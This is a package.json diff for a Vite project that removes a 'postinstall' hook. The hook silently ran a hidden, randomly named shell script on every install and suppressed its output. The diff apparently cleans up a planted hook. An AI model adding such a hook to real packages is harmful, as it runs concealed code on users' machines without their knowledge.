@@ -8,8 +8,7 @@
     "build": "vite build",
     "preview": "vite preview",
     "clean": "rm -rf dist",
-    "lint": "tsc --noEmit",
-    "postinstall": "sh ./.ci-b7eheg.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "tsc --noEmit"
   },
   "dependencies": {
     "@google/genai": "^1.29.0",
